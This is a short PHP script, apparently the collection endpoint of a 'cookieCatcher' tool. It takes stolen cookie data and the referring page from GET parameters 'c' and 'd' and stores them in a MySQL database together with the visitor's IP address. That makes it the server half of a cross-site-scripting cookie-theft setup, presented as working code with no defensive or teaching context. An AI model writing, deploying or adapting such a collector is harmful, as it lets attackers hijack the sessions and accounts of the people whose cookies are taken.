<?php
include('inc/configure.php');
include('inc/mysql_querylab.php');
include('inc/cookieCatcher.php');

////////////////////////////////////
## Initiate Objects/Classes
$catcher = new cookieCatcher();

////////////////////////////////////
## Initiate DB Connection
$catcher->connect($db_HOST, $db_USERNAME, $db_PASSWORD, $db_NAME);

////////////////////////////////////
## Grab cookie data and store in MySQL
$cdata = isset($_GET['c']) ? $_GET['c'] : '';
$referer = isset($_GET['d']) ? $_GET['d'] : '';

// Check for valid cookie data
if (!empty($cdata) && !empty($referer)) {
    $ip = $_SERVER['REMOTE_ADDR'];
    $catcher->grab($ip, $referer, $cdata);
}
?>
